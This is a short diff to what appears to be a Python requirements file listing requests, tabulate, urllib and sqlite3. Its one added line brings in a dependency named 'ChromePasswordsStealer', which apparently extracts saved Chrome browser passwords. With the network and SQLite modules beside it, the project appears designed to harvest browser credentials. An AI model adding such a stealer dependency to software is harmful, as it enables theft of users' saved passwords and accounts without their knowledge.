@@ -3,3 +3,4 @@ requests
 tabulate
 urllib
 sqlite3
+ChromePasswordsStealer
